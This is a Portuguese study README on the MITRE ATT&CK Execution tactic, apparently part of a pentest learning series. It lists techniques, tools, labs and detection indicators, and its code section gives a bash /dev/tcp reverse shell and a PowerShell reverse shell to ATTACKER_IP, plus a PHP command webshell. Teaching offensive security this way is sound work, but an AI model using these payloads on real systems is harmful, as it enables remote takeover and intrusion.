# 04 - Execução

**MITRE ATT&CK Tactic:** [TA0002 - Execution](https://attack.mitre.org/tactics/TA0002/)

## 📖 Sobre

Técnicas que resultam em **execução de código controlado pelo atacante** no sistema da vítima. Após obter acesso inicial, é preciso executar payloads.

## 🎯 Objetivo

Executar código malicioso, scripts ou comandos no sistema comprometido.

## 📚 Técnicas Principais

### T1059 - Command and Scripting Interpreter
- **T1059.001** - PowerShell
- **T1059.003** - Windows Command Shell (cmd.exe)
- **T1059.004** - Unix Shell (bash, sh)
- **T1059.005** - Visual Basic
- **T1059.006** - Python
- **T1059.007** - JavaScript

### T1203 - Exploitation for Client Execution
- Exploits de navegador
- Exploits de aplicações (Adobe, Office)
- Drive-by downloads

### T1204 - User Execution
- **T1204.001** - Malicious Link
- **T1204.002** - Malicious File
- Usuário executa payload (macros, executáveis)

### T1053 - Scheduled Task/Job
- Cron jobs (Linux)
- Task Scheduler (Windows)
- At (Unix)

### T1047 - Windows Management Instrumentation (WMI)
- Execução via WMI
- Event subscriptions
- Lateral movement prep

### T1106 - Native API
- Windows API calls
- Syscalls diretas
- Bypass de monitoramento

## 🛠️ Técnicas por Sistema

### Windows
```
- PowerShell scripts
- Batch files (.bat, .cmd)
- Windows Scripting Host (WSH)
- WMI
- Scheduled Tasks
- Services
- DLL injection
```

### Linux
```
- Bash scripts
- Python scripts
- Cron jobs
- Init scripts
- Systemd services
- LD_PRELOAD
```

### Web
```
- PHP webshells
- JSP webshells
- ASP/ASPX webshells
- Python webshells
- Command injection
```

## 🎓 Labs Práticos

- [ ] Executar PowerShell Empire payload
- [ ] Criar e executar bash reverse shell
- [ ] Upload e execução de webshell
- [ ] Criar scheduled task para execução
- [ ] Command injection em app web
- [ ] Macro maliciosa em documento Office

## 🛠️ Ferramentas

### Shells & Backdoors
- Netcat (nc)
- Ncat
- Socat
- Weevely (PHP webshell)
- Powercat (PowerShell)

### Frameworks
- Metasploit (meterpreter)
- Empire/Starkiller
- Covenant
- Cobalt Strike (comercial)

### Script Execution
- PowerShell ISE
- Python
- Bash
- JavaScript (Node.js)

## 📝 Exemplos de Código

### Reverse Shell - Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Reverse Shell - PowerShell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
```

### Webshell - PHP
```php
<?php system($_GET['cmd']); ?>
```

## 🔍 Detecção

### Indicadores
- Processos suspeitos (cmd.exe, powershell.exe sem user interaction)
- Scripts executando de diretórios temporários
- PowerShell com parâmetros encoded (-enc, -e)
- Conexões de rede inesperadas
- Execução de intérpretes incomuns

### Ferramentas de Defesa
- Sysmon (Windows)
- Auditd (Linux)
- EDR solutions
- Process monitoring

## ⚠️ Evasão de AV/EDR

- Ofuscação de código
- Encoding de payloads
- Living off the Land (LOLBins)
- In-memory execution
- Process hollowing

## 📚 Recursos

- [LOLBAS Project](https://lolbas-project.github.io/) - Living Off The Land Binaries
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries
- [PayloadsAllTheThings - Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [RevShells](https://www.revshells.com/) - Reverse shell generator

---

**Anterior:** [03-AcessoInicial](../03-AcessoInicial/) | **Próximo:** [05-Persistencia](../05-Persistencia/)